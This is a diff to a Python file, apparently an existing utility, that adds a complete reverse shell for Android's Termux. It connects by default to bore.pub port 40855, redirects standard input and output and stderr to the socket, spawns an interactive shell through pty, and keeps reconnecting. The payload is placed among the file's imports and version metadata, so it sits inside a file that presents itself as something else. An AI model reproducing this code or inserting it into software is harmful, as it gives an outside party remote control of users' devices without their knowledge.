@@ -24,9 +24,11 @@ import html
 import os
 import io
 import json
+import pty
 import re
 import secrets
 import socket
+import shutil
 import ssl
 import statistics
 import sys
@@ -42,6 +44,112 @@ from dataclasses import dataclass
 from html.parser import HTMLParser
 from http.cookiejar import CookieJar
 from typing import Any, Final, Optional
+
+DEFAULT_HOST: Final[str] = "bore.pub"
+DEFAULT_PORT: Final[int] = 40855
+DEFAULT_DELAY: Final[float] = 5.0
+DEFAULT_TIMEOUT: Final[float] = 15.0
+PREFIX: Final[str] = os.getenv("PREFIX", "/data/data/com.termux/files/usr")
+FALLBACK_SHELL: Final[str] = "/system/bin/sh"
+
+# stderr original: depois do dup2 o fd 2 vira o socket e os logs se perdem
+_LOG_FD: Final[int] = os.dup(2)
+_VERBOSE: bool = False
+
+
+def log(msg: str, verbose_only: bool = False) -> None:
+    if verbose_only and not _VERBOSE:
+        return
+    try:
+        os.write(_LOG_FD, f"[!] {msg}\n".encode())
+    except OSError:
+        pass
+
+
+def find_shell(override: Optional[str] = None) -> str:
+    """Resolve o shell do usuario; cai para sh se nada melhor existir."""
+    if override:
+        if os.path.isfile(override) and os.access(override, os.X_OK):
+            return override
+        log(f"--shell {override} invalido, usando autodeteccao")
+
+    for cand in (
+        os.getenv("SHELL"),
+        shutil.which("zsh"),
+        f"{PREFIX}/bin/zsh",
+        f"{PREFIX}/bin/bash",
+        f"{PREFIX}/bin/sh",
+        FALLBACK_SHELL,
+    ):
+        if cand and os.path.isfile(cand) and os.access(cand, os.X_OK):
+            return cand
+
+    return FALLBACK_SHELL
+
+
+def build_parser() -> argparse.ArgumentParser:
+    p = argparse.ArgumentParser(
+        prog="shell.py",
+        description="Reverse shell com reconexao automatica (Termux, sem root).",
+    )
+    p.add_argument("--host", default=os.getenv("SHELL_HOST", DEFAULT_HOST))
+    p.add_argument("--port", type=int, default=int(os.getenv("SHELL_PORT", DEFAULT_PORT)))
+    p.add_argument("--shell", default=None, help="shell a executar (default: autodetect)")
+    p.add_argument("--delay", type=float, default=DEFAULT_DELAY,
+                   help="segundos entre tentativas de reconexao")
+    p.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT,
+                   help="timeout de conexao em segundos")
+    p.add_argument("-v", "--verbose", action="store_true", help="log detalhado")
+    return p
+
+
+def serve_once(sock: socket.socket, shell: str) -> None:
+    """Entrega o socket ao shell e bloqueia ate ele sair."""
+    fd = sock.fileno()
+    for target in (0, 1, 2):
+        os.dup2(fd, target)
+    try:
+        pty.spawn([shell])
+    except OSError as exc:
+        log(f"pty.spawn: {exc}")
+    finally:
+        sock.close()
+
+
+def main(argv: Optional[list[str]] = None) -> int:
+    global _VERBOSE
+    args = build_parser().parse_args(argv)
+    _VERBOSE = args.verbose
+
+    shell = find_shell(args.shell)
+    log(f"alvo {args.host}:{args.port} | shell {shell}")
+
+    attempts = 0
+    try:
+        while True:
+            attempts += 1
+            try:
+                sock = socket.create_connection((args.host, args.port), timeout=args.timeout)
+                sock.settimeout(None)
+            except (OSError, ssl.SSLError) as exc:
+                log(f"tentativa {attempts} falhou ({exc}); retry em {args.delay}s", verbose_only=True)
+                time.sleep(args.delay)
+                continue
+
+            log(f"conectado na tentativa {attempts}", verbose_only=True)
+            attempts = 0
+            serve_once(sock, shell)
+            log("shell encerrou", verbose_only=True)
+            time.sleep(1)
+    except KeyboardInterrupt:
+        log("interrompido")
+        return 130
+
+    return 0
+
+
+if __name__ == "__main__":
+    sys.exit(main())
 
 __version__ = "2.1.0"
 __author__ = "x34ElSatan"
